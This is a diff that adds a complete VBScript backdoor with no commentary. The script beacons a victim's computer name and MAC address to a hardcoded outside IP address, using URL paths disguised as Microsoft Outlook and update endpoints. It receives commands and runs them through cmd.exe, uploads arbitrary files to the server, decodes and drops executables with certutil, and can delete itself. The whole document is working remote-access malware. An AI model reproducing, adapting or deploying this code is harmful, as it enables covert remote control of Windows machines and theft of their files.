@@ -1,0 +1,362 @@
+Dim timeout:timeout = 10
+Dim bUrl:bIP = "93.190.137.212"
+Dim port:port = "80"
+Dim sRequest:sRequest = ""
+Dim pUrl: pUrl = "http://" + bIP + ":" + port + "/Micrsoft/Outlook/initialization"
+Dim sendUrl: sendUrl = "http://" + bIP + ":" + port + "/Micrsoft/Updates/kbupdate"
+Dim htmlUrl:htmlUrl = "http://" + bIP + ":" + port +"/Micrsoft/Office/validation?"
+Dim exitFlag:exitFlag = False
+
+Dim fso:Set fso = CreateObject("Scripting.FileSystemObject")
+Dim oShell:Set oShell = WScript.CreateObject("WScript.Shell")
+Dim oHTTP:Set oHTTP = CreateObject("Microsoft.XMLHTTP")
+
+hname = GetHName()
+mac = GetMAC(hname)
+
+Do While True
+	m_rnd = Rand()
+	params = "m=" + mac + "&n=" + hname + "&t=" + CStr(timeout) + "&r=" + CStr(m_rnd)
+	params = EncodeText(params)
+	answer = GetHTML(htmlUrl + params)
+	If answer<>"Error" Then
+		results = parseAnswer(answer)
+		For Each response In results 
+			If response<>"" Then
+				HTTPPost pUrl, response
+				If exitFlag = True Then
+					WScript.Quit 1
+				End If
+			End If
+		Next 
+	End If
+	WScript.Sleep timeout * 60000
+Loop
+
+Function runJob(rep_id, arg0, arg1)
+	Dim result: result = ""
+	sRequest = ""	
+	Dim sf: sf=False
+	If (arg0 ="!cmd") Then  
+		arg1 = Replace(arg1, "`", """")
+		result = ExecFunc(arg1, "")
+	ElseIf (arg0 = "!cmdd") Then
+		arg1 = Replace(arg1, "`", """")
+		result = EncodeText(ExecFuncD(arg1, ""))
+	ElseIf (arg0 = "!dump") Then
+		result = EncodeText(Dump(arg1))
+	ElseIf (arg0 = "!timeout") Then
+		timeout = CInt(arg1)
+		result = EncodeText("Set tm=" + arg1)
+	ElseIf (arg0 = "!bye") Then
+		result = EncodeText("Bye!")
+		exitFlag = True
+	ElseIf (arg0 = "!kill") Then
+		result = EncodeText("Kill!")
+		kill()
+		exitFlag = True
+	ElseIf (arg0 = "!up") Then
+		path = arg1
+		text = EncodeFile(path)
+		If text<>"" Then
+			SendFile sendUrl, text, CStr(rep_id)
+			sf = True
+		Else
+			result = EncodeText("Error: Read file to send")
+		End If
+	Else
+		result = EncodeText("Error: Invalid arguments")
+	End If
+	If sf=False Then
+		sRequest = "id=" + CStr(rep_id) + "&r=" + result
+	Else
+		sf=False
+	End If
+	runJob = sRequest
+End Function
+
+
+Function kill()
+	strScript = WScript.ScriptFullName
+	fso.DeleteFile(strScript)
+End Function
+
+
+Function WriteFile(text)
+	On Error Resume Next
+	outFile=GenFile(False)
+	Set objFile = fso.CreateTextFile(outFile,True)
+	objFile.Write text
+	objFile.Close
+	If Err.Number <> 0 Then
+		outFile = "Error: " + CStr(Err.Description)
+	End If
+	On Error Goto 0
+	WriteFile = outFile
+End Function
+
+Function ReadFile(path)
+	On Error Resume Next
+	If fso.FileExists(path) Then
+		Set file = fso.OpenTextFile(path, 1, 1)
+		ReadFile = file.ReadAll
+		file.Close		
+	End If
+	If Err.Number<>0 Then
+		ReadFile = "Error: " + CStr(Err.Description)
+	End If
+	On Error Goto 0
+End Function
+
+Function GenFile(fFlag)
+	gf = ""
+	If fFlag=True Then
+		gf = CStr(GetTemp) + "\~DE" + CStr(Rand) + ".exe"
+	Else
+		gf = CStr(GetTemp) + "\~DF" + CStr(Rand) + ".tmp"
+	End If
+	GenFile = gf
+End Function
+
+Function EncodeText(text)
+	strText = "Error"
+	source = WriteFile(text)
+	If InStr(1, source, "Error")<>1 Then
+		dest = GenFile(False)
+		If dest<>"Error" Then
+			cmd = "certutil -encode -f " + source + " " + dest
+			oShell.Run cmd, 0, True
+			strText = ReadFile(dest)
+			If InStr(1, strText, "Error")<>1 Then
+				DelFile(dest)
+				DelFile(source)
+				If strText<>"" Then
+					strText = Replace(strText, "+", "*")
+				End If
+			End If
+		End If
+	End If
+	EncodeText = strText
+End Function
+
+Function EncodeFile(source)
+	strText = "Error"
+	dest = GenFile(False)
+	If dest<>"Error" Then
+		cmd = "certutil -encode -f " + source + " " + dest
+		On Error Resume Next
+		oShell.Run cmd, 0, True
+		On Error Goto 0
+		strText = ReadFile(dest)
+		If InStr(1, strText, "Error")<>1 Then
+			DelFile(dest)
+			If strText<>"" Then
+				strText = Replace(strText, "+", "*")
+			End If
+		End If
+	End If
+	EncodeFile = strText
+End Function
+
+Function Decode(source)
+	dest = "Error"
+	dest = GenFile(True)
+	If dest<>"Error" Then
+		cmd = "certutil -decode -f " + source + " " + dest
+		On Error Resume Next
+		oShell.Run cmd, 0, True
+		On Error Goto 0
+		WScript.Sleep(2000)
+		DelFile(source)
+	End If
+	Decode = dest
+End Function
+
+Function DecodeText(text)
+	dest = GenFile(False)
+	text = Replace(text, "*", "+")
+	source = WriteFile(text)
+	If InStr(1, source, "Error")<>1 Then
+		cmd = "certutil -decode -f " + source + " " + dest  		
+		oShell.Run cmd, 0, True
+		text = ReadFile(dest)
+		If InStr(1, text, "Error")<>1 Then
+			DelFile(source)
+			DelFile(dest)
+		Else:
+			text = "Error"
+		End If
+	End If
+	DecodeText = text
+End Function
+
+Function GetTemp()
+	result = ""
+	On Error Resume Next
+	result = fso.GetSpecialFolder(2)
+	If Err.Number <> 0 Then
+		result = "Error: " + CStr(Err.Description)
+	End If
+	On Error Goto 0
+	GetTemp = result
+End Function
+
+Function Dump(encode_file)
+	text = Replace(encode_file, "*", "+")
+	path = WriteFile(text)
+	Dump = Decode(path)
+End Function
+
+Function DelFile(path)
+	If fso.FileExists(path) Then
+		On Error Resume Next
+		fso.DeleteFile(path)
+		If Err.Number<>0 Then
+			WScript.Sleep 1000
+			DelFile path
+		End If
+		On Error Goto 0	
+	End If
+End Function
+
+
+Function ExecFuncD(arg, arg2)
+	On Error Resume Next
+	strText = "Task Run!"
+	If (arg2<>"") Then
+		cmd = "cmd.exe /c " + arg + " " + arg2
+	Else
+		cmd = "cmd.exe /c " + arg	
+	End If	
+	oShell.Run cmd, 0, False
+	On Error Goto 0	
+	ExecFuncD = strText
+End Function
+
+Function ExecFunc(arg, arg2)
+	On Error Resume Next
+	strText = "None"
+	outfile = GenFile(False)
+	If (arg2<>"") Then
+		cmd = "cmd.exe /c chcp 866 & " + arg + " " + arg2 + " >" + outfile +" 2>&1"
+	Else
+		cmd = "cmd.exe /c chcp 866 & " + arg + " >" + outfile +" 2>&1"	
+	End If
+	
+	oShell.Run cmd, 0, True
+	
+	If fso.FileExists(outfile) Then
+		strText = EncodeFile(outfile)
+	Else:
+		strText = "Error: File don't exists"
+	End If
+	DelFile(outfile)
+	On Error Goto 0	
+	ExecFunc = strText
+End Function
+
+Function HTTPPost(pUrl, sRequest)
+	On Error Resume Next	
+	oHTTP.open "POST", pUrl,False
+	oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+	oHTTP.setRequestHeader "Content-Length", Len(sRequest)
+	oHTTP.send sRequest
+	HTTPPost = oHTTP.responseText
+	sRequest = ""
+	On Error Goto 0
+End Function
+
+Function SendFile(sendUrl, b64file, rep_id)
+	On Error Resume Next
+	sRequest = "id=" + CStr(rep_id) + "&kb=" + b64file
+	oHTTP.open "POST", sendUrl, False
+	oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+	oHTTP.setRequestHeader "Content-Length", Len(sRequest)
+	oHTTP.send sRequest
+	HTTPPost = oHTTP.responseText
+	sRequest = ""
+	On Error Goto 0
+End Function
+
+Function parseAnswer(serv_answer)
+	answer = DecodeText(serv_answer)
+	result = ""
+	result_array = Array()
+	If answer <> "OK" Then
+		Dim cmds:cmds = Split(answer, "@")
+		ReDim Preserve result_array (UBound(cmds))
+		For i = 0 To UBound(cmds)
+			answer = cmds(i)
+			If answer<>"" Then
+				Dim report_id
+				Dim cmd
+				pos = InStr(answer, ":")
+				pos2 = InStr(answer, "$")
+				If pos2<>0 Then
+					If pos <> -1 Then
+						l =  pos2 - (pos + 1)
+						report_id = Mid(answer, pos + 1, l)
+					End If
+					If pos2 <> -1 Then
+						l = (Len(answer)) - (pos2 + 3)
+						cmd = Mid(answer, pos2 + 3, l + 1)
+					End If
+					posSpace = InStr(cmd, " ")
+					arg0 = ""
+					arg1 = ""
+					If posSpace <> -1 Then
+						arg0 = Mid(cmd, 1, posSpace -1)
+						arg1 = Mid(cmd, posSpace + 1, Len(cmd) - posSpace)
+						result = runJob(report_id, arg0, arg1)
+						result_array(i) = result
+					End If
+				End If 
+			End If
+		Next
+	End If
+	parseAnswer = result_array
+End Function
+
+Function Rand()
+	Randomize
+	rd = Int((30000-1+10000)*Rnd+10000)
+	Rand = rd
+End Function
+
+Function GetHName()
+	On Error Resume Next
+	Set oShellEnv = oShell.Environment("Process")
+	computerName  = oShellEnv("ComputerName")
+	If Err.Number <> 0 Then
+		computerName = "UnknownNamePC0"
+	End If
+	On Error Goto 0
+	GetHName = CStr(computerName)
+End Function
+
+Function GetMAC(hostname)
+	On Error Resume Next
+	Dim WMI:  Set WMI = GetObject("winmgmts:\\.\root\cimv2")
+	Dim Nads: Set Nads = WMI.ExecQuery("Select * from Win32_NetworkAdapter where physicaladapter=true") 
+	Dim nad
+	res = ""
+	For Each Nad In Nads
+		If Not IsNull(Nad.MACAddress) Then res = nad.MACAddress   
+	Next
+	If Err.Number <> 0 Then
+		res = "MAC-" + hostname
+	End If
+	On Error Goto 0
+	GetMAC = res 
+End Function
+
+Function GetHTML(URL)
+	On Error Resume Next
+	GetHTML = "Error"
+	With CreateObject("MSXML2.XMLHTTP")
+		.Open "GET", URL, False
+		.Send
+		GetHTML = .ResponseText
+	End With
+	On Error Goto 0
+End Function
